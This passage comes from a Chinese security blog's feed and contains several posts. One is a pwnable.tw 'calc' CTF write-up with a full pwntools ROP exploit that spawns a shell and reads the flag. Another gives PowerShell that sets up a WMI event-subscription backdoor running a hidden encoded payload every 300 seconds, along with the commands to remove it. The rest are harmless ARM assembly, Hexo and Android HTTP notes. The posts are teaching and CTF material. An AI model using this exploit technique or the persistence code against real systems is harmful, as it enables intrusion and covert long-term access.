<p>这里的<code>value_stack</code>是运算变量栈，用于存放输入的运算符两边的数字，例如输入<code>1+3</code>,则value_stack的变化是这样的<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">value_stack 的运算值栈变化</div><div class="line">value_stack[0] 是标记当前运算结果,value_stack[1...n] 是实际值</div><div class="line">输入1  -&gt;  1|1|</div><div class="line">输入`+` 这里会进入运算符栈中</div><div class="line">输入3   -&gt;  2|1|3|</div><div class="line">计算得   value_stack[value_stack[0]-1] += v[value_stack[0]]  也即 1+3 = 4，之后value_stack[0]--</div></pre></td></tr></table></figure></p>
<p>但问题来了，当我们尝试输入<code>+2</code>时变化是这样的<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入+</div><div class="line">输入1 -&gt; 1|2</div><div class="line">计算得 value_stack[value_stack[0]-1] += v[value_stack[0]]  也即  0 + 2 = 2，0 是由于程序默认赋值,之后value_stack[0]--</div><div class="line">在打印的时候调用如下代码:</div><div class="line">  printf((const char *)&amp;unk_80BF804, value_stack[value_stack[0] - 1 + 1]); </div><div class="line">造成 打印value_stack[X])的效果，X是我们输入的+X中的X</div></pre></td></tr></table></figure></p>
<p>知道通过输入<code>+X</code>可以泄露打印value_stack[X]的值，那么我们可以尝试泄露stack cookie来造成栈异常，但仔细研究了一下，除了运算符那个栈可溢出，但仅限于”+-*/“，所以实际意义不大，再仔细分析，可以发现，程序还可以造成栈上任意地址写的效果，<br>发生在<code>eval</code>的函数中<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">_DWORD *__<span class="function">cdecl <span class="title">eval</span><span class="params">(_DWORD *value_stack, <span class="keyword">char</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  _DWORD *result; <span class="comment">// eax</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( a2 == <span class="string">'+'</span> )</div><div class="line">  &#123;</div><div class="line">    value_stack[*value_stack - <span class="number">1</span>] += value_stack[*value_stack];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="string">'+'</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( a2 == <span class="string">'-'</span> )</div><div class="line">    &#123;</div><div class="line">      value_stack[*value_stack - <span class="number">1</span>] -= value_stack[*value_stack];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'/'</span> )</div><div class="line">    &#123;</div><div class="line">      value_stack[*value_stack - <span class="number">1</span>] /= value_stack[*value_stack];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'*'</span> )</div><div class="line">  &#123;</div><div class="line">    value_stack[*value_stack - <span class="number">1</span>] *= value_stack[*value_stack];</div><div class="line">  &#125;</div><div class="line">  result = value_stack;</div><div class="line">  --*value_stack;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过构造<code>+X+Y</code>或者<code>+X-Y</code>,当然<code>*/</code>也能用，如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入+</div><div class="line">输入X   -&gt;  1|X</div><div class="line">输入+ 计算得到   -&gt; X|  , 也即 (*value_stack)  = X</div><div class="line">输入Y   -&gt;  </div><div class="line">      if ( Y &gt; 0 )</div><div class="line">      &#123;</div><div class="line">        v4 = (*value_stack)++;          //注意这里的 ++造成后的X 变为 X + 1</div><div class="line">        value_stack[v4 + 1] = Y ;             </div><div class="line">      &#125;</div><div class="line">计算得到 value_stack[(X  + 1)- 1]+= Y</div><div class="line">这里需要注意的是，写X位置处的值，会把X+1处的值填充掉</div></pre></td></tr></table></figure></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>好了原理都知道了，一个栈上任意读，一个任意写，可以很快的pwn掉，但有一个坑在于，这里面在布置int 80利用代码时，需要<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">eax=11 # sys_execve</div><div class="line">ebx=&quot;/bin/sh&quot;</div><div class="line">ecx=0</div><div class="line">edx=0</div></pre></td></tr></table></figure></p>
<p>ebx需要在栈上面布置一个binsh的字符串，这就需要用到ebp了，而ebp&gt;0x80000000 !!! 坑的是输入的值是一个int类型，无法写高于0x7FFFFFFF的值(因为你不能输入-进去当数字运算)，所以这里用了一个小技巧，通过多次累加让目标值溢出，最终的利用代码如下,<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">printf_plt = <span class="number">0</span></div><div class="line"></div><div class="line">LOCALFILE = <span class="string">'./calc'</span></div><div class="line">HOST = <span class="string">'chall.pwnable.tw'</span></div><div class="line">PORT = <span class="number">10100</span></div><div class="line"></div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(LOCALFILE)</div><div class="line">	<span class="comment">#gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(HOST, PORT)</div><div class="line">	</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_int</span><span class="params">(off)</span>:</span></div><div class="line">	p.sendline(<span class="string">"+&#123;0&#125;"</span>.format(off))</div><div class="line">	x = p.recv()</div><div class="line">	x = int(x)</div><div class="line">	<span class="keyword">return</span> x</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_int</span><span class="params">(off,dat,op=<span class="string">'+'</span>)</span>:</span></div><div class="line">	p.sendline(<span class="string">"+&#123;0&#125;&#123;1&#125;&#123;2&#125;"</span>.format(off,op,dat))</div><div class="line">	p.recvuntil(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#0x080701AA : pop edx ; ret</span></div><div class="line"><span class="comment">#0x0805c34b : pop eax ; ret</span></div><div class="line"><span class="comment">#0x0809E7A4 : pop ebx ; pop esi ; ret</span></div><div class="line"><span class="comment">#0x080701d1 : pop ecx ; pop ebx ; ret</span></div><div class="line"><span class="comment">#0x08070880 : _dl_sysinfo_int80</span></div><div class="line">pop_edx_ret =  <span class="number">0x080701AA</span></div><div class="line">pop_eax_ret  = <span class="number">0x0805c34b</span></div><div class="line">pop_ebx2_ret = <span class="number">0x0809E7A4</span></div><div class="line">pop_ecx2_ret = <span class="number">0x080701d1</span></div><div class="line">_dl_sysinfo_int80 = <span class="number">0x08070880</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#cookie 357</span></div><div class="line"><span class="comment">#ebp 360</span></div><div class="line"><span class="comment">#ret 361</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">set0</span><span class="params">(off,y=<span class="number">0</span>)</span>:</span></div><div class="line">	x = read_int(off)</div><div class="line">	<span class="keyword">print</span> (<span class="string">'before: '</span> + hex((x <span class="keyword">if</span> x &gt;=<span class="number">0</span> <span class="keyword">else</span> x+<span class="number">0x100000000</span>)))</div><div class="line">	<span class="keyword">if</span> (x &gt; y):</div><div class="line">		x = (x-y)		</div><div class="line">		<span class="keyword">print</span> (<span class="string">'fix(-): '</span> + hex(x) , <span class="string">"to "</span> + hex(y))</div><div class="line">		write_int(off,x,<span class="string">'-'</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> (y &gt; <span class="number">0x80000000</span>):</div><div class="line">			<span class="keyword">print</span> (<span class="string">'fix(*): '</span> + hex(x) , <span class="string">"to "</span> + hex(y))</div><div class="line">			n = y / x</div><div class="line">			m = y % x</div><div class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n<span class="number">-1</span>):</div><div class="line">				write_int(off,x,<span class="string">'+'</span>)</div><div class="line">			write_int(off,m,<span class="string">'+'</span>)	</div><div class="line">		<span class="keyword">else</span>:			</div><div class="line">			x = y - x</div><div class="line">			<span class="keyword">print</span> (<span class="string">'fix(+): '</span> + hex(x) , <span class="string">"to "</span> + hex(y))</div><div class="line">			write_int(off,x,<span class="string">'+'</span>)</div><div class="line">	x = read_int(off)</div><div class="line">	<span class="keyword">print</span> (<span class="string">'after: '</span> + hex((x <span class="keyword">if</span> x &gt;=<span class="number">0</span> <span class="keyword">else</span> x+<span class="number">0x100000000</span>)))</div><div class="line">	</div><div class="line">cookie = <span class="number">357</span></div><div class="line">ebp = <span class="number">360</span></div><div class="line">ret = <span class="number">361</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></div><div class="line">	leak_cookie = read_int(cookie)</div><div class="line">	leak_ebp= read_int(ebp)</div><div class="line">	leak_ret= read_int(ret)</div><div class="line">	fleak_ebp = (leak_ebp <span class="keyword">if</span> leak_ebp &gt; <span class="number">0</span> <span class="keyword">else</span> leak_ebp+<span class="number">0x100000000</span>)</div><div class="line">	</div><div class="line">	binsh = fleak_ebp + <span class="number">0x30</span></div><div class="line">	binsh = (binsh <span class="keyword">if</span> binsh &gt; <span class="number">0</span> <span class="keyword">else</span> binsh+<span class="number">0x100000000</span>)</div><div class="line">	write_int(<span class="number">380</span>,<span class="number">0x68732F</span>,<span class="string">'+'</span>)</div><div class="line">	write_int(<span class="number">379</span>,<span class="number">0x6E69622F</span>,<span class="string">'+'</span>)</div><div class="line">	<span class="keyword">print</span> (<span class="string">'binsh'</span> , hex(binsh))</div><div class="line"></div><div class="line">	set0(ret,pop_eax_ret)</div><div class="line">	set0(ret+<span class="number">1</span>,<span class="number">11</span>)</div><div class="line"></div><div class="line">	set0(ret+<span class="number">2</span>,pop_ecx2_ret)</div><div class="line">	set0(ret+<span class="number">3</span>,<span class="number">0</span>)</div><div class="line"></div><div class="line">	set0(ret+<span class="number">5</span>,pop_ebx2_ret)</div><div class="line">	set0(ret+<span class="number">6</span>,binsh)</div><div class="line"></div><div class="line">	set0(ret+<span class="number">8</span>,pop_edx_ret)</div><div class="line">	set0(ret+<span class="number">9</span>,<span class="number">0</span>)</div><div class="line">	set0(ret+<span class="number">10</span>,_dl_sysinfo_int80)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'=== Welcome to SECPROG calculator ===\n'</span>)</div><div class="line">	pwn()</div><div class="line">	p.sendline(<span class="string">""</span>)</div><div class="line">	p.sendline(<span class="string">"cat /home/calc/flag"</span>)</div><div class="line">	p.interactive()</div><div class="line">main()</div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[谈非PE在攻击中的"持久性"实现]]></title>
      <url>/2017/09/20/%E8%81%8A%E4%B8%80%E8%81%8A%E9%9D%9EPE%E5%9C%A8%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7/</url>
      <content type="html"><![CDATA[<blockquote>
<p>本文主要探讨针对Windows平台攻击中，如何以非PE方式完成“持久性”后门的实现。</p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Windows平台下，我们习惯性将与PE可执行文件相对立的“脚本”（通常以源代码文本存储）称之为非PE，例如用Js、Vbs、Powershell、Bat等编写的文件，亦或者是安装有运行时宿主进程环境下的C#、Java、Python、PHP等文件。由于这些非PE文件的类型众多，因而其存在的形式也各种各样，攻击载荷的投递方式也千变万化。一次成功的攻击流程应该是<code>信息收集 -&gt; 渗透攻击 -&gt; 后渗透攻击 -&gt;  结束？</code>其中“渗透攻击”经过一系列的攻击、绕过，从而接近”高价值“目标，在”后渗透攻击“阶段则进行价值挖掘，业务信息窃取等操作，同时为了保证攻击成果的最大化，通常需要保证从攻击方到目标点搭建一个稳定的、持续的通路，也即攻击的”持续性“。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="使用WMI进行驻留"><a href="#使用WMI进行驻留" class="headerlink" title="使用WMI进行驻留"></a>使用WMI进行驻留</h3><p>权限要求:管理员权限<br>下面代码功能为 间隔300s调起powershell执行一次$EncScript功能</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">$fname</span> = <span class="string">"XXX Filter"</span></div><div class="line"><span class="variable">$cname</span> = <span class="string">"XXX Consumer"</span></div><div class="line"></div><div class="line"><span class="keyword">try</span></div><div class="line">&#123;</div><div class="line">	<span class="variable">$Query</span> = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span></div><div class="line">	<span class="variable">$EncScript</span> = <span class="string">''</span></div><div class="line">				</div><div class="line">	<span class="variable">$fp</span> = @&#123;</div><div class="line">		NameSpace = (<span class="string">'root\subscription'</span>)</div><div class="line">		CLASS = (<span class="string">'__EventFilter'</span>)</div><div class="line">		Arguments = @&#123; Name = <span class="variable">$fname</span></div><div class="line">			EventNameSpace = (<span class="string">'root\cimv2'</span>)</div><div class="line">			QueryLanguage = (<span class="string">'WQL'</span>)</div><div class="line">			Query = <span class="variable">$Query</span></div><div class="line">		&#125;</div><div class="line">		Erroraction = (<span class="string">'SilentlyContinue'</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="variable">$wmif</span> = <span class="built_in">Set-WMIInstance</span> @fp</div><div class="line"></div><div class="line">	<span class="variable">$cp</span> = @&#123;</div><div class="line">		NameSpace = (<span class="string">'root\subscription'</span>)</div><div class="line">		CLASS = (<span class="string">'CommandLineEventConsumer'</span>)</div><div class="line">		Arguments = @&#123;name = <span class="variable">$cname</span> ; CommandlIneteMplate = (<span class="string">'powershell.exe -NoP -NonI -W Hidden -E '</span> + <span class="string">"<span class="variable">$EncScript</span>"</span>) &#125;</div><div class="line">		Erroraction = (<span class="string">'SilentlyContinue'</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="variable">$wmic</span> = <span class="built_in">Set-WMIInstance</span> @cp</div><div class="line">	<span class="built_in">Set-WmiInstance</span> -Class __FilterToConsumerBinding -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;<span class="keyword">Filter</span>=<span class="variable">$wmif</span>;Consumer=<span class="variable">$wmic</span>&#125; </div><div class="line">	</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span></div><div class="line">&#123;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>针对上述后门的清除<br><figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __EventFilter -Filter <span class="string">"Name='<span class="variable">$fname</span>'"</span> | <span class="built_in">Remove-WmiObject</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class CommandLineEventConsumer -Filter <span class="string">"Name='<span class="variable">$cname</span>'"</span> | <span class="built_in">Remove-WmiObject</span></div><div class="line"><span class="built_in">Get-WMIObject</span> -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter <span class="string">"__Path LIKE '%XXX%'"</span> | <span class="built_in">Remove-WmiObject</span></div></pre></td></tr></table></figure></p>
<p>WMI中存储数据<br><figure class="highlight powershell"><table><tr><td class="code"><pre><div class="line"><span class="variable">$staticclass</span> = <span class="built_in">new-object</span> Management.ManagementClass(<span class="string">'root\default'</span>,<span class="literal">$null</span>,<span class="literal">$null</span>)</div><div class="line"><span class="variable">$staticclass</span>.Name = (<span class="string">'Win32_BotTag'</span>)</div><div class="line"><span class="variable">$staticclass</span>.put()</div><div class="line"></div><div class="line"><span class="comment">#存储</span></div><div class="line"><span class="variable">$staticclass</span>.properties.Add((<span class="string">'nob'</span>) , <span class="string">' '</span>)</div><div class="line"><span class="variable">$staticclass</span>.put()</div><div class="line"></div><div class="line"><span class="comment">#取出</span></div><div class="line">([WmiClass] <span class="string">'root\default:Win32_BotTag'</span>).Properties[<span class="string">'nob'</span>]</div></pre></td></tr></table></figure></p>
<p>鉴于权限要求为管理员权限，一般情况下均需要bypassUAC，接下来聊聊完整性约束和UAC的相关问题。</p>
<h3 id="Windows完整性机制与UAC"><a href="#Windows完整性机制与UAC" class="headerlink" title="Windows完整性机制与UAC"></a>Windows完整性机制与UAC</h3><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>时隔2个月之后，再次来填这个坑已经填不动了，本文的主要内容已经通过文章、演讲的方式与大家分享，具体的链接如下，<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Xdef2017议题&lt;非PE攻防之道&gt; http://www.xdef.org.cn/xdef2017/speakers.html</div><div class="line">&lt;No Power No Shell --- 非PE攻击中的套路&gt; https://bbs.pediy.com/thread-221871.htm</div></pre></td></tr></table></figure></p>
<p>–本文完–</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/09/19/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">int</span> a = <span class="number">1</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[arm指令学习]]></title>
      <url>/2017/03/05/%5B%E9%80%86%E5%90%91%E7%AF%87%5Darm%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="1-arm汇编基础"><a href="#1-arm汇编基础" class="headerlink" title="1. arm汇编基础"></a>1. arm汇编基础</h2><h3 id="1-LDMIA-R0-R1-R2-R3-R4"><a href="#1-LDMIA-R0-R1-R2-R3-R4" class="headerlink" title="1. LDMIA R0 , {R1,R2,R3,R4}"></a>1. LDMIA R0 , {R1,R2,R3,R4}</h3><p>LDM为: 多寄存器”内存取”指令<br>IA表示每次LDM指令结束之后R0增加1个字<br>最终结果为R1 = [R0], R1 = [R0+#4], R1 = [R0+#8], R1 = [R0+#0xC]</p>
<h3 id="2-堆栈寻址-FA、EA、FD、ED"><a href="#2-堆栈寻址-FA、EA、FD、ED" class="headerlink" title="2. 堆栈寻址 (FA、EA、FD、ED)"></a>2. 堆栈寻址 (FA、EA、FD、ED)</h3><p>STMFD SP! , {R1-R7,LR} @ 将R1~R7以及LR入栈<br>LDMFD SP! , {R1-R7,LR} @ 将R1~R7以及LR出栈</p>
<h3 id="3-块拷贝寻址"><a href="#3-块拷贝寻址" class="headerlink" title="3. 块拷贝寻址"></a>3. 块拷贝寻址</h3><p>LDM和STM为指令前缀，表示多寄存器寻址，指令后缀(IA、DA、IB、DB)。<br>LDMIA R0!, {R1-R3}  @从R0所指向的内存地址依次取出3个字到R1、R2、R3寄存器<br>STMIA R0!, {R1-R3}  @将R1、R2、R3所存储的内容依次存放在R0所指向的内存。</p>
<h3 id="4-相对寻址"><a href="#4-相对寻址" class="headerlink" title="4. 相对寻址"></a>4. 相对寻址</h3><pre><code>以当前程序计数器PC的当前值为基地址，将标号标记位置为偏移量，两者相加得
到有效地址。

<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">BL NEXT</div><div class="line">    ...        </div><div class="line">NEXT:</div><div class="line">    ...</div></pre></td></tr></table></figure>
</code></pre><h2 id="2-指令集"><a href="#2-指令集" class="headerlink" title="2. 指令集"></a>2. 指令集</h2><h3 id="1-由于arm芯片更新很快，所以指令集很多，使用较为普遍的就是arm指令集以及Thumb指令集。"><a href="#1-由于arm芯片更新很快，所以指令集很多，使用较为普遍的就是arm指令集以及Thumb指令集。" class="headerlink" title="1. 由于arm芯片更新很快，所以指令集很多，使用较为普遍的就是arm指令集以及Thumb指令集。"></a>1. 由于arm芯片更新很快，所以指令集很多，使用较为普遍的就是arm指令集以及Thumb指令集。</h3><p><img src="~/20-47-17.jpg" alt=""><br><img src="~/20-47-25.jpg" alt=""><br><img src="~/20-41-45.jpg" alt=""><br><img src="~/20-47-45.jpg" alt=""><br><img src="~/20-47-55.jpg" alt=""></p>
<h3 id="2-跳转指令"><a href="#2-跳转指令" class="headerlink" title="2.跳转指令"></a>2.跳转指令</h3><p>arm实现了两种跳转类型，一种是直接使用跳转指令，另外一种则是给PC寄存器直接赋值。</p>
<h4 id="1-B跳转指令"><a href="#1-B跳转指令" class="headerlink" title="1. B跳转指令"></a>1. B跳转指令</h4><pre><code>结构 B{cond} label    
直接跳走，如`BNE LABEL`
</code></pre><h4 id="2-BL跳转指令"><a href="#2-BL跳转指令" class="headerlink" title="2. BL跳转指令"></a>2. BL跳转指令</h4><pre><code>结构 BL{cond} label    
执行BL指令时，若条件满足，则首先将当前指令的下一条指令的地址赋值给R14寄存器(LR)，然
后跳转到label标记的地址处继续执行。一般用在过程调用中，过程结束之后通过`MOV PC, LR`返回
</code></pre><h4 id="3-BX带状态切换的跳转指令"><a href="#3-BX带状态切换的跳转指令" class="headerlink" title="3. BX带状态切换的跳转指令"></a>3. BX带状态切换的跳转指令</h4><pre><code>结构 BX{cond}Rm   
当执行BX指令时，如果条件满足，会判断Rm寄存器的位[0]是否为1，如果是1则会在跳转时自动将CPSR寄存器的T标志位置为1,并将目标位置处的指令解析为Thumb指令，相反，若Rm寄存器的位[0]为0，则将CPSR寄存器的T标志位复位，同时将目标位置的指令解析为arm指令。
</code></pre><p> 如下:<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line">ADR R0, thumbcode + 1</div><div class="line">BX R0       @跳转到thumbcode。并且处理器运行为thumb模式</div><div class="line">thumbcode:</div><div class="line">.code 16</div></pre></td></tr></table></figure></p>
<h4 id="4-BLX带链接和状态切换的跳转指令"><a href="#4-BLX带链接和状态切换的跳转指令" class="headerlink" title="4.BLX带链接和状态切换的跳转指令"></a>4.BLX带链接和状态切换的跳转指令</h4><pre><code>结构 BLX{cond}Rm
BLX指令集合了BL和BX的功能，在BX的功能上同时保存返回地址到R14(LR)
</code></pre><h3 id="3-寄存器访问指令"><a href="#3-寄存器访问指令" class="headerlink" title="3.寄存器访问指令"></a>3.寄存器访问指令</h3><p>存储器访问指令操作包括从存储区加载数据，存储数据到存储器，寄存器与存储器之间的数据交换等。</p>
<h4 id="LDR"><a href="#LDR" class="headerlink" title="LDR"></a><code>LDR</code></h4><p>指令包括:<br><code>LDR{type}{cond}Rd,label</code><br><code>LDRD{cond}Rd,Rd2,label</code><br>其中type表示操作的数据大小，取值如下</p>
<p><img src="~/21-36-36.jpg" alt=""><br><img src="~/21-37-48.jpg" alt=""><br>LDRD依次加载双字的数据,用法如下：<br><code>LDRD R0, R1, label2</code>@从标号labe2加载两个字到R0,R1中</p>
<h4 id="STR"><a href="#STR" class="headerlink" title="STR"></a><code>STR</code></h4><p>STR用于存储数据到制定地址。格式如下：<br>STR{type}{cond}Rd,label<br>STRD{cond}Rd,Rd2,label<br>用法如下:<br><code>STR R0,[R2,#04]</code> 将R0的值存储到R2+4的地址处</p>
<h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM"></a><code>LDM</code></h4><p><code>LDM{addr_mode}{cond}Rn{!}reglist</code></p>
<p><img src="~/21-44-36.jpg" alt=""></p>
<blockquote>
<p>特别注意, ! 为可选后缀。如果有 ! 则最终地址会写回到Rn寄存器</p>
</blockquote>
<h4 id="STM"><a href="#STM" class="headerlink" title="STM"></a><code>STM</code></h4><p>STM将一个寄存器列表的数据存储到指定的地址单元中。格式如下</p>
<p><code>STM{addr_mod}{cond}Rn{!}reglist</code></p>
<h4 id="PUSH-amp-amp-POP"><a href="#PUSH-amp-amp-POP" class="headerlink" title="PUSH&amp;&amp;POP"></a><code>PUSH&amp;&amp;POP</code></h4><p>格式如下：<br>PUSH{cond}reglist<br>POP{cond}reglist<br>栈操作指令<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">PUSH &#123;r0,r4-r7&#125;</div><div class="line">POP &#123;r0,r4-r7&#125;</div></pre></td></tr></table></figure></p>
<h4 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a><code>SWP</code></h4><p>寄存器之间的数据交换。<br>格式为<code>SWP{B}{cond}Rd,Rm,[Rn]</code><br>B是可选的字节，若有B，则交换字节，否则交换字<br>Rd为临时存放的寄存器，Rm是<code>要替换</code>的值<br>Rn是<code>要被替换</code>的数据地址</p>
<h2 id="其他逻辑、运算指令，具体还是看手册了解…"><a href="#其他逻辑、运算指令，具体还是看手册了解…" class="headerlink" title="其他逻辑、运算指令，具体还是看手册了解…"></a>其他逻辑、运算指令，具体还是看手册了解…</h2><p>—未完待续—</p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android开发之简单http请求]]></title>
      <url>/2017/03/05/%5B%E5%BC%80%E5%8F%91%E7%AF%87%5Dandroid%E5%BC%80%E5%8F%91%E4%B9%8B%E7%AE%80%E5%8D%95http%E8%AF%B7%E6%B1%82/</url>
      <content type="html"><![CDATA[<p>直接代码了<br>通过<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithHttpURLConnection</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">//开启线程发起网络请求</span></div><div class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</div><div class="line">                BufferedReader reader = <span class="keyword">null</span>;</div><div class="line">                <span class="keyword">try</span> &#123;</div><div class="line">                    URL url = <span class="keyword">new</span> URL(<span class="string">"http://ring3.xyz"</span>);</div><div class="line">                    connection = (HttpURLConnection) url.openConnection();</div><div class="line">                    connection.setRequestMethod(<span class="string">"GET"</span>);</div><div class="line">                    connection.setConnectTimeout(<span class="number">5000</span>);</div><div class="line">                    connection.setReadTimeout(<span class="number">5000</span>);</div><div class="line">                    InputStream in = connection.getInputStream();</div><div class="line"></div><div class="line">                    <span class="comment">//读取输入流</span></div><div class="line">                    reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</div><div class="line">                    StringBuilder response = <span class="keyword">new</span> StringBuilder();</div><div class="line">                    String line;</div><div class="line">                    <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>)</div><div class="line">                    &#123;</div><div class="line">                        response.append(line);</div><div class="line">                    &#125;</div><div class="line">                    showResponse(response.toString());</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">finally</span> &#123;</div><div class="line">                    <span class="keyword">if</span> (reader != <span class="keyword">null</span>) &#123;</div><div class="line">                        <span class="keyword">try</span>&#123;</div><div class="line">                            reader.close();</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">                            e.printStackTrace();</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">if</span> (connection != <span class="keyword">null</span>) &#123;</div><div class="line">                        connection.disconnect();</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;).start();</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
